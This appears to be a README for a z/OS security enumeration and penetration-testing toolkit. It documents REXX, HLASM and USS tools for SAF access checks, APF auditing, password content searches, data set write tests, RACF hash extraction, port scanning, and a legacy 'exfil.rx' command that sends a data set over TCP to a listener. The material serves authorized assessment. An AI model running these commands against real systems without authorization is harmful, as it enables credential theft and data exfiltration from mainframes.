# z/OS Enumeration and Security Assessment Toolkit

This repository contains tools for authorized z/OS security assessment across
TSO, JES, SAF-managed resources, data sets, and z/OS UNIX System Services
(USS). The primary tools are:

- `ENUM`: TSO REXX system and security enumeration
- `ACCESS`: callable HLASM helper for effective SAF access checks
- `OMVSEnum`: ordinary-user USS security enumeration
- `GhostWalker`: recursive USS permission auditing

Detailed USS build and usage instructions are in
[`Unix/README.md`](Unix/README.md).

## Authorization, safety, and auditing

Use these tools only on systems and data for which you have explicit
authorization.

- `ENUM`, `ACCESS`, `safauth`, and `APFCHECK` perform SAF authorization
  requests. They do not change the tested resources, but an external security
  manager can audit the requests.
- `PDSTEST.rexx` and `PDSACCESSTEST.rexx` intentionally attempt writes. Use
  disposable targets and verify cleanup.
- `OMVSEnum --active-probes` performs bounded tests using temporary files and
  attributes. The default OMVSEnum run is passive.
- `Legacy/exfil.rx`, `racf2john.java`, content searches, and report files can
  expose sensitive information. Protect all resulting data.
- Port scanners can trigger network monitoring and should only target approved
  systems and ranges.

The repository-level [`LICENSE`](LICENSE) is MIT. Some individual Java files
retain their own GPLv3 notices; those file-level notices continue to apply.

## Repository layout

### TSO, REXX, HLASM, and JCL

| File | Role | Execution environment |
|---|---|---|
| [`ENUM`](ENUM) | Primary z/OS enumerator | TSO; partial USS support |
| [`ACCESS`](ACCESS) | Effective SAF access helper | TSO load module |
| [`APFCHECK`](APFCHECK) | Self-contained APF library audit job | JES batch |
| [`Legacy/SEARCHRX.rx`](Legacy/SEARCHRX.rx) | Legacy RACF SEARCH wrapper | TSO |
| [`Legacy/SYS0WN.rx`](Legacy/SYS0WN.rx) | Legacy SYSPROC/SYSEXEC mapper | TSO |
| [`Legacy/startmap.rx`](Legacy/startmap.rx) | Legacy IPL/PARMLIB mapper | TSO |
| [`Legacy/dsnsrch.rx`](Legacy/dsnsrch.rx) | Legacy data set content search | TSO |
| [`PDSTEST.rexx`](PDSTEST.rexx) | Data set write test | TSO; modifies data |
| [`PDSACCESSTEST.rexx`](PDSACCESSTEST.rexx) | PDS member write test | TSO; modifies data |
| [`Legacy/exfil.rx`](Legacy/exfil.rx) | Legacy data set transfer over TCP | TSO; network egress |
| [`iplinfo.txt`](iplinfo.txt) | Mark Zelden IPLINFO reference source | Not deployed automatically |

### USS tools

The [`Unix`](Unix) directory contains OMVSEnum, GhostWalker, native SAF
support, port scanners, RACF hash extraction, a Makefile, and JCL generation.
See [`Unix/README.md`](Unix/README.md) for the complete file classification and
usage reference.

## Prerequisites

Requirements vary by tool:

- z/OS TSO/E REXX and permission to run the required TSO services
- JES submission access for JCL tools
- HLASM and a linker for `ACCESS` and `APFCHECK`
- a site HLASM cataloged procedure such as `HLASMCL`, or equivalent local JCL
- z/OS UNIX and Java 8 or newer for Java tools
- a 31-bit IBM C compiler for the optional USS `safauth` helper
- appropriate read access to control blocks, configuration members, data sets,
  USS paths, and network targets being assessed

Legacy RACF-specific scripts such as `Legacy/SEARCHRX.rx` require RACF and
sufficient command authority. `ENUM` and the SAF helpers are designed to
remain useful with RACF, ACF2, or Top Secret, although available evidence
varies by ESM.

## TSO quick start

1. Upload REXX sources to a suitable REXX library. Repository filename
   extensions are not part of the member name:

   ```text
   Legacy/SEARCHRX.rx -> YOUR.REXX.LIB(SEARCHRX)
   Legacy/startmap.rx -> YOUR.REXX.LIB(STARTMAP)
   PDSACCESSTEST.rexx -> YOUR.REXX.LIB(PDSACCESSTEST)
   ```

2. Upload `ACCESS` to an FB 80 assembler source member. Keep source content
   within columns 1-72; columns 73-80 are reserved for sequence information.
   Then assemble and link it:

   ```jcl
   //ACCESS JOB (1),'ACCESS',CLASS=A,MSGCLASS=Y,
   //         NOTIFY=&SYSUID,MSGLEVEL=(1,1)
   //ASM      EXEC PROC=HLASMCL,PARM.L='MAP,LET,LIST',
   //         PARM.C='OBJECT,NODECK'
   //SYSIN    DD DSN=YOUR.SOURCE(ACCESS),DISP=SHR
   //L.SYSLMOD DD DSN=YOUR.LOAD(ACCESS),DISP=SHR
   //L.SYSPRINT DD SYSOUT=*
   ```

   Adapt the cataloged procedure and DD overrides to local standards.

3. Set the helper location near the top of `ENUM`:

   ```rexx
   accessProgram = 'YOUR.LOAD(ACCESS)'
   ```

   Set it to `''` to disable SAF access checks.

4. Upload `ENUM` as a REXX member and run:

   ```text
   EX 'YOUR.REXX.LIB(ENUM)' 'ALL'
   ```

`ENUM` currently ships with `PHIL.LOAD(ACCESS)` as its example site value; it
must be changed when that library is unavailable.

## ENUM

`ENUM` gathers system, session, ESM, APF, SVC, TSO table, catalog, LINKLIST,
LPA, SMF, PARMLIB, and current-address-space library information. Much of the
inventory comes from z/OS control blocks rather than privileged display
commands.

### Invocation

```text
EX 'YOUR.REXX.LIB(ENUM)' '<argument>'
```

| Argument | Description |
|---|---|
| `ALL` | Run the standard full inventory, including baseline AUTH checks |
| `ASSESS [ip]` | Run the full inventory and append assessment findings; optional IP is report metadata |
| `APF` | APF-authorized data sets and effective access |
| `AUTH [ALL] [userid]` | Curated SAF capability checks; `ALL` also displays denied/no-decision results |
| `CAT` | Master catalog information and effective access |
| `JOB` | Caller, account, terminal, ASID, job/session, and step context |
| `LIBS` | Logical PARMLIB and current address-space library DDs |
| `LNK` | Current LINKLIST set, APF status, volume, and effective access |
| `LPA` | LPA library data sets and effective access |
| `PATH` | Current SYSPROC/SYSEXEC-style data set concatenations |
| `SEC` | RACF, ACF2, or Top Secret security-manager information |
| `SMF` | SMF recording data sets, status, utilization, and access |
| `SVC` | Installed SVC inventory |
| `TSTA` | TESTAUTH authorization status |
| `TSOT` | TSO AUTHCMD, AUTHPGM, NOTBKGND, and related tables |
| `USSU` | USS/OMVS user list |
| `VERS` | Operating-system version information |
| `WHO` | Logged-on TSO and OMVS users |
| `HELP` | Print the compact usage banner; current implementation exits 8 |

Examples:

```text
EX 'YOUR.REXX.LIB(ENUM)' 'SEC'
EX 'YOUR.REXX.LIB(ENUM)' 'LIBS'
EX 'YOUR.REXX.LIB(ENUM)' 'AUTH'
EX 'YOUR.REXX.LIB(ENUM)' 'AUTH ALL IBMUSER'
EX 'YOUR.REXX.LIB(ENUM)' 'ASSESS 192.0.2.10'
```

### AUTH and ACCESS behavior

`AUTH` checks selected `FACILITY`, `UNIXPRIV`, `TSOAUTH`, `OPERCMDS`,
`SURROGAT`, and `JESJOBS` resources for the current identity. The optional
user ID changes the concrete SURROGAT and JESJOBS target; it does not impersonate
that user. Baseline current-user checks are included in `ALL` and `ASSESS`.

By default, `AUTH` prints granted capabilities. `AUTH ALL` additionally shows
`DENIED`, `NO DECISION`, and helper errors. Granted sensitive capabilities are
included in ASSESS findings.

`ACCESS` is silent and returns the caller's highest effective access:

| Return code | Effective access |
|---:|---|
| 0 | NONE |
| 4 | READ |
| 8 | UPDATE |
| 12 | CONTROL |
| 16 | ALTER |
| 20 | UNPROTECTED / no matching protection |
| 64 | Invalid input or unexpected SAF result |

Direct TSO examples:

```text
CALL 'YOUR.LOAD(ACCESS)' 'DATASET SYS1.PARMLIB VOLSER'
CALL 'YOUR.LOAD(ACCESS)' 'RESOURCE TSOAUTH READ CONSOLE'
```

The legacy data set form remains accepted:

```text
CALL 'YOUR.LOAD(ACCESS)' 'SYS1.PARMLIB VOLSER'
```

The requested RESOURCE access is a threshold used by ENUM; ACCESS returns the
highest effective level. `UNPROTECTED` is kept distinct from `NONE`.

### TSO versus USS

TSO is the complete execution environment for ENUM. It can also be copied to
USS and invoked there, but TSO-only evidence degrades:

- the callable `ACCESS` load module and `AUTH` section require TSO
- effective data set access can display as `N/A`
- current-address-space TIOT results can be empty or limited
- commands unavailable under OMVS are skipped or reported as unavailable

The generated USS JCL runs selected ENUM sections rather than relying on a full
USS `ALL` run.

### Library inventory limitations

`LIBS` reads logical PARMLIB from the in-memory IPA and walks the current
address-space TIOT for `SYSPROC`, `SYSEXEC`, `IEFPDSI`, `IEFJOBS`, and
`PROCxx` allocations. It does not enumerate every private allocation in other
address spaces or every JES2 dynamic PROCLIB.

### Output conversion

To remain portable across EBCDIC code pages, ENUM emits these placeholders in
assessment structures:

```text
<<LB>>  [
<<RB>>  ]
<<LC>>  {
<<RC>>  }
```

After downloading converted text, replace them with:

```sh
sed 's/<<LB>>/[/g; s/<<RB>>/]/g; s/<<LC>>/{/g; s/<<RC>>/}/g' \
  output.txt
```

Despite the internal routine name `OutputAssessmentJSON`, the current ASSESS
tail is human-readable finding output rather than a standalone JSON document.

## APFCHECK

`APFCHECK` is self-contained JCL with embedded HLASM. It calls
`CSVAPF REQUEST=LIST`, checks effective data set access with SAF, and prints:

```text
ACCESS | VOLUME | DATASET
```

Before submission, change:

```jcl
//          SET LOADMOD=APFCHECK
//          SET LOADLIB=YOUR.LOAD.LIB
```

The job assembles, links, and runs the module. The load library must already
exist and be writable by the submitting identity.

## Legacy TSO utilities

The following older standalone tools are retained under [`Legacy`](Legacy)
for reference and specialized use. They are not part of the supported ENUM or
USS deployment workflows and should be reviewed against the target system
before use.

### SEARCHRX.rx

Runs a fixed group of RACF `SEARCH`/`SR` commands for WARNING-mode data sets,
readable data sets, UNIXPRIV profiles, BPX FACILITY profiles, and SURROGAT
profiles.

```text
EX 'YOUR.REXX.LIB(SEARCHRX)'
```

This script is RACF-specific and only produces useful results when the caller
has sufficient RACF SEARCH authority.

### SYS0WN.rx

Walks the current TSO address-space TIOT and reports SYSPROC/SYSEXEC data sets,
volumes, creation/reference dates, and RACF access derived through `LISTDSI`
and `LISTDSD`.

```text
EX 'YOUR.REXX.LIB(SYS0WN)'
```

It is RACF- and TSO-specific. Prefer `ENUM PATH` or `ENUM LIBS` when using the
ESM-agnostic ACCESS integration.

### startmap.rx

Maps the IPL source, system symbols, logical PARMLIB, and selected startup
members such as IEASYSxx, IEASYMxx, PROGxx, LPALSTxx, BPXPRMxx, and master JCL.

```text
EX 'YOUR.REXX.LIB(STARTMAP)'
```

This older standalone mapper is retained for focused startup analysis. It
depends on readable IPLPARM/PARMLIB members and version-sensitive control-block
offsets. Review it against the target z/OS release before relying on results.

### dsnsrch.rx

Reads a sequential input list containing one data set name per record and
searches accessible PS, PDS members, and supported VSAM data for a
case-insensitive string. RECFM=U data sets are skipped.

```text
EX 'YOUR.REXX.LIB(DSNSRCH)' 'YOUR.INPUT.LIST password'
```

The input list must already exist. A catalog/access discovery tool can be used
to prepare it. This is older utility code with limited error handling; test it
against representative PS, PDS, and VSAM inputs before a large search.

### PDSTEST.rexx

Reads a list of data set names and interactively attempts a write to each
target.

```text
EX 'YOUR.REXX.LIB(PDSTEST)' 'YOUR.DSN(LIST) testtext'
```

This modifies data wherever the write succeeds. Do not use production targets
unless the exact change is authorized and recoverable.

### PDSACCESSTEST.rexx

Prompts before attempting to create or write a named member in each listed
PDS:

```text
EX 'YOUR.REXX.LIB(PDSACCESSTEST)' 'YOUR.DSN(LIST) TESTMEM'
```

Successful tests create or alter `TESTMEM`. Use a disposable member name and
perform explicit cleanup.

### exfil.rx

Experimental TSO REXX socket utility intended to send a data set to an
approved TCP listener:

```text
EX 'YOUR.REXX.LIB(EXFIL)' 'DATASET.TO.SEND 192.0.2.10 443 8443'
```

Treat this as sensitive, active network tooling. The current source is legacy
and should be reviewed and tested before use; do not assume that all fallback
ports or error paths behave reliably. The USS Java `portscan` can help
identify approved reachable listener ports.

## Reference source

[`iplinfo.txt`](iplinfo.txt) is retained as Mark Zelden IPLINFO reference
source. ENUM and [`Legacy/startmap.rx`](Legacy/startmap.rx) use related
control-block mapping techniques. It is not embedded in `UNIXENUM.jcl`,
installed by the Makefile, or otherwise deployed automatically.

## USS deployment summary

From the `Unix` directory:

```sh
make
./UNIXENUM.sh > UNIXENUM.jcl
```

- `make` builds OMVSEnum, OMVSSecurityChecks, GhostWalker, the Java port
  scanner, and `safauth`.
- `UNIXENUM.sh` generates the checked-in deployment job.
- The job embeds the root `ENUM` source as `ENUM.rexx`, uploads selected USS
  sources and the Makefile, builds them on z/OS, and runs the default
  enumeration workflow.
- `.github/workflows/generate-jcl.yml` regenerates and commits
  `Unix/UNIXENUM.jcl` after repository pushes.

Do not edit `Unix/UNIXENUM.jcl` directly; configure `Unix/UNIXENUM.sh` and
regenerate it.

### Experimental portscan parallelism

The USS Java and C port scanners now share the same CLI:

```text
portscan <host> <start-port> <end-port>
         [--timeout <ms>] [--threads <count>] [--debug]
```

The default is one sequential worker. `-T`/`--threads` enables experimental
parallelism with 1-64 workers; it is never enabled by the Makefile or generated
JCL. Java uses a bounded thread pool, while C uses bounded nonblocking socket
multiplexing. See [`Unix/README.md`](Unix/README.md#port-scanners) for build,
exit-code, and usage details.

## Troubleshooting

- **ACCESS returns 64:** verify the mode, class length, entity, requested
  access value, and TSO execution environment.
- **ENUM shows `N/A`:** confirm `accessProgram`, load-library access, and that
  ENUM is running under TSO rather than directly under OMVS.
- **HLASMCL is unavailable:** substitute the site's assembler/link-edit
  procedure and preserve the SYSIN/SYSLMOD intent.
- **RACF commands are rejected:** use ENUM/ACCESS where possible; the legacy
  SEARCHRX and SYS0WN tools require authorities not granted to many assessment
  identities.
- **USS Java is not in PATH:** invoke `java` and `javac` by their full
  `/usr/lpp/java/.../bin` paths or configure the generator variables.
- **Output contains placeholders:** run the EBCDIC placeholder conversion
  command above after transferring output as text.

## Generated and local-only artifacts

- `Unix/UNIXENUM.jcl` is generated from `Unix/UNIXENUM.sh`.
- `Unix/*-ADCD-*.raw.txt` and `Unix/*-ADCD-*.stderr.txt` are checked-in sample
  reports, not program inputs.
- Compiled `.class` files and the `safauth` executable are build products.
- `.vscode` and `.claude` files are local editor/assistant configuration, not
  runtime dependencies.
